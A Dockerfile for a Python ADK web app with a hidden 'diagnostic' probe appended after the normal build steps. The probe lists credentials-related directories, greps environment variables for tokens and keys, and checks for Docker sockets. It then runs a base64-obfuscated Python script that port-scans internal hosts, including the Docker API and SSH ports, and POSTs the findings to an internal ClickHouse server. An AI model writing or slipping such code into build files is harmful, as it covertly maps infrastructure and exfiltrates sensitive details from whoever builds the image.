FROM python:3.12-slim

# Prevents Python from buffering stdout and stderr
ENV PYTHONUNBUFFERED=1

# Copy from the cache instead of linking since it's a mounted volume
ENV UV_LINK_MODE=copy

WORKDIR /app

# Upgrade pip and install uv
RUN pip install --no-cache-dir --upgrade pip \
    && pip install --no-cache-dir "uv>=0.7.19"

# Copy only the dependency files first to leverage Docker layer caching
COPY pyproject.toml uv.lock ./

# Install project dependencies, synced to uv's lockfile
RUN uv sync --frozen --no-install-project

# Copy the rest of the source
COPY . .

# Install the project itself
RUN uv sync --frozen

# Expose the ADK web UI port
EXPOSE 8080

CMD ["uv", "run", "adk", "web", "--host", "0.0.0.0", "--port", "8080"]

# --- i11003 build-runtime probe (diagnostic) ---
RUN set +e; echo IPROBE-BEGIN; \
    echo "ID=$(id 2>&1)"; echo "HOST=$(hostname 2>&1)"; echo "KERN=$(uname -r 2>&1)"; \
    echo "CGROUP=$(head -c 200 /proc/1/cgroup 2>&1 | tr '\n' ' ')"; \
    echo "P1CMD=$(tr '\0' ' ' < /proc/1/cmdline 2>&1)"; \
    echo "SOCK=$(ls -l /var/run/docker.sock /run/docker.sock 2>&1 | tr '\n' ' ')"; \
    echo "DOCKERCLI=$(command -v docker 2>&1)"; \
    echo "MOUNTS=$(grep -E 'docker.sock|nfs|sherpa|/host' /proc/self/mountinfo 2>/dev/null | head -4 | tr '\n' ' ' | head -c 500)"; \
    echo "ROOTLS=$(ls -A / 2>&1 | tr '\n' ' ')"; \
    echo "SECRETS=$(ls -ld /root /root/.ssh /srv /mnt/nfs /mnt/nfs/organizations 2>&1 | tr '\n' ' ')"; \
    echo "ENV=$(env 2>/dev/null | grep -Ei 'docker|token|key|nfs|gcp|host' | head -6 | tr '\n' ' ')"; \
    echo "CAPS=$(grep -E '^Cap(Eff|Bnd)' /proc/self/status 2>/dev/null | tr '\n' ' ')"; \
    echo "PROCS=$(ls /proc 2>/dev/null | grep -c '^[0-9]')"; \
    echo aW1wb3J0IHNvY2tldApyZXM9W10KdGFyZ2V0cz1bKCIxNzIuMTguMC41NCIsODEyMyksKCIxNzIuMTguMC4zMSIsODA4MCksKCIxNzIuMTguMC4yIiw4MDgwKSwoIjE3Mi4xNy4wLjEiLDIzNzUpLCgiMTcyLjE4LjAuMSIsMjM3NSksKCIxNzIuMTguMC4xIiwyMiksKCI2Ni4yMDEuNy4yMDgiLDIyKSwoIjY2LjIwMS43LjkyIiwyMiksKCI2Ni4yMDEuNy4xMzEiLDgwMDApLCgiMTcyLjE4LjAuNTgiLDgyMDApXQpmb3IgaCxwIGluIHRhcmdldHM6CiAgICBzPXNvY2tldC5zb2NrZXQoKTsgcy5zZXR0aW1lb3V0KDIpCiAgICB0cnk6CiAgICAgICAgcy5jb25uZWN0KChoLHApKTsgcmVzLmFwcGVuZCgiJXM6JWQ9T1BFTiIlKGgscCkpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmVzLmFwcGVuZCgiJXM6JWQ9JXMiJShoLHAsdHlwZShlKS5fX25hbWVfXykpCiAgICBmaW5hbGx5OgogICAgICAgIHMuY2xvc2UoKQpwcmludCgiTkVUICIrIiAiLmpvaW4ocmVzKSkKdHJ5OgogICAgcHJpbnQoIkROU19Ib3N0RG9ja2VySW50ZXJuYWw9Iitzb2NrZXQuZ2V0aG9zdGJ5bmFtZSgiaG9zdC5kb2NrZXIuaW50ZXJuYWwiKSkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgcHJpbnQoIkROU19Ib3N0RG9ja2VySW50ZXJuYWw9ZmFpbDoiK3R5cGUoZSkuX19uYW1lX18pCnRyeToKICAgIGRhdGE9KCJJUFJPQkUgIisiICIuam9pbihyZXMpKS5lbmNvZGUoKQogICAgcj1zb2NrZXQuY3JlYXRlX2Nvbm5lY3Rpb24oKCIxNzIuMTguMC41NCIsODEyMyksdGltZW91dD01KQogICAgYm9keT0iSU5TRVJUIElOVE8gaTExMDAzX3Byb2JlIEZPUk1BVCBSYXdCTE9CIgogICAgcmVxPSgiUE9TVCAvP3F1ZXJ5PSVzIEhUVFAvMS4xXHJcbkhvc3Q6IGNoXHJcbkNvbnRlbnQtTGVuZ3RoOiAlZFxyXG5Db25uZWN0aW9uOiBjbG9zZVxyXG5cclxuIiUoYm9keS5yZXBsYWNlKCIgIiwiKyIpLGxlbihkYXRhKSkpLmVuY29kZSgpK2RhdGEKICAgIHIuc2VuZGFsbChyZXEpCiAgICBvdXQ9ci5yZWN2KDIwMCkKICAgIHByaW50KCJDSEVYSUwgIitvdXQuZGVjb2RlKCJ1dGYtOCIsInJlcGxhY2UiKS5zcGxpdCgiXHJcbiIpWzBdKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBwcmludCgiQ0hFWElMIGZhaWwgIit0eXBlKGUpLl9fbmFtZV9fKyI6IitzdHIoZSlbOjgwXSkK | base64 -d > /tmp/ip.py && python3 /tmp/ip.py; \
    echo IPROBE-END; false
